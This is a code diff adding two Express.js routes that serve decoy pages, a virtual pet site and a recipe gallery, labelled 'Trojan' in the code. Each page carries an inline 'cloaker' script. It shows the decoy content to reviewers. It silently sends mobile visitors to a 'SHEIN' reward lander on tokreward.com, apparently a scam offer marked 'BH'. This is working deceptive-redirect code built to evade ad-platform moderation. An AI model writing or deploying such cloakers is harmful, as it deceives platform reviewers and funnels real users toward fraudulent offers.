@@ -17,6 +17,250 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/94713/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Virtual Pet Sanctuary</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #e0f7fa;
+                    color: #006064;
+                }
+                .container {
+                    max-width: 1000px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #00bcd4;
+                    color: white;
+                    text-align: center;
+                    padding: 30px 0;
+                    border-radius: 0 0 20px 20px;
+                }
+                h1 {
+                    margin: 0;
+                    font-size: 2.2em;
+                }
+                .pet-showcase {
+                    display: flex;
+                    justify-content: space-around;
+                    flex-wrap: wrap;
+                    margin-top: 30px;
+                }
+                .pet-card {
+                    background-color: white;
+                    border-radius: 15px;
+                    padding: 20px;
+                    width: 250px;
+                    margin-bottom: 20px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    text-align: center;
+                }
+                .pet-card img {
+                    width: 150px;
+                    height: 150px;
+                    border-radius: 50%;
+                    object-fit: cover;
+                    margin-bottom: 15px;
+                }
+                .adopt-button {
+                    background-color: #ff4081;
+                    color: white;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 20px;
+                    cursor: pointer;
+                    transition: background-color 0.3s;
+                }
+                .adopt-button:hover {
+                    background-color: #f50057;
+                }
+                footer {
+                    margin-top: 40px;
+                    text-align: center;
+                    color: #006064;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug}'s Virtual Pet Sanctuary</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <p>Welcome to ${slug}'s Virtual Pet Sanctuary! Adopt a digital companion and experience the joy of pet ownership without the mess. Our virtual pets are always happy, healthy, and ready for adventure!</p>
+                    <div class="pet-showcase">
+                        <div class="pet-card">
+                            <img src="https://picsum.photos/150/150?random=1" alt="Virtual Dog">
+                            <h3>Pixel Pup</h3>
+                            <p>A loyal and energetic virtual dog that never needs walks!</p>
+                            <button class="adopt-button">Adopt Now</button>
+                        </div>
+                        <div class="pet-card">
+                            <img src="https://picsum.photos/150/150?random=2" alt="Virtual Cat">
+                            <h3>Digital Kitty</h3>
+                            <p>A purr-fect virtual cat that won't scratch your furniture.</p>
+                            <button class="adopt-button">Adopt Now</button>
+                        </div>
+                        <div class="pet-card">
+                            <img src="https://picsum.photos/150/150?random=3" alt="Virtual Rabbit">
+                            <h3>Byte Bunny</h3>
+                            <p>A cute and cuddly virtual rabbit that hops into your heart.</p>
+                            <button class="adopt-button">Adopt Now</button>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Find your perfect pixelated pal with ${slug} &copy; 2024 ${slug}'s Virtual Pet Sanctuary | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9055/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Culinary Adventures</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Arial', sans-serif;
+                    background-color: #f5f5f5;
+                    color: #333;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #ff6b6b;
+                    color: white;
+                    text-align: center;
+                    padding: 40px 0;
+                }
+                h1 {
+                    margin: 0;
+                    font-size: 2.5em;
+                }
+                .recipe-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 20px;
+                    margin-top: 40px;
+                }
+                .recipe-card {
+                    background-color: white;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    overflow: hidden;
+                }
+                .recipe-card img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .recipe-info {
+                    padding: 20px;
+                }
+                .recipe-info h3 {
+                    margin-top: 0;
+                    color: #ff6b6b;
+                }
+                footer {
+                    margin-top: 40px;
+                    text-align: center;
+                    color: #888;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug}'s Gourmet Gallery</h1>
+            </header>
+            <div class="wrapper">
+                <main>
+                    <p>Welcome to ${slug}'s Gourmet Gallery, where culinary dreams come to life! Explore our collection of mouthwatering recipes and embark on a gastronomic journey.</p>
+                    <div class="recipe-grid">
+                        <div class="recipe-card">
+                            <img src="https://picsum.photos/300/200?random=1" alt="Recipe 1">
+                            <div class="recipe-info">
+                                <h3>Zesty Lemon Pasta</h3>
+                                <p>A refreshing and tangy pasta dish perfect for summer evenings.</p>
+                            </div>
+                        </div>
+                        <div class="recipe-card">
+                            <img src="https://picsum.photos/300/200?random=2" alt="Recipe 2">
+                            <div class="recipe-info">
+                                <h3>Spicy Mango Curry</h3>
+                                <p>A fusion of sweet and spicy flavors that will tantalize your taste buds.</p>
+                            </div>
+                        </div>
+                        <div class="recipe-card">
+                            <img src="https://picsum.photos/300/200?random=3" alt="Recipe 3">
+                            <div class="recipe-info">
+                                <h3>Chocolate Avocado Mousse</h3>
+                                <p>A guilt-free dessert that's both rich and nutritious.</p>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Savor the flavors with ${slug} &copy; 2024 ${slug}'s Gourmet Gallery | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/9413/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html?slug=941`;
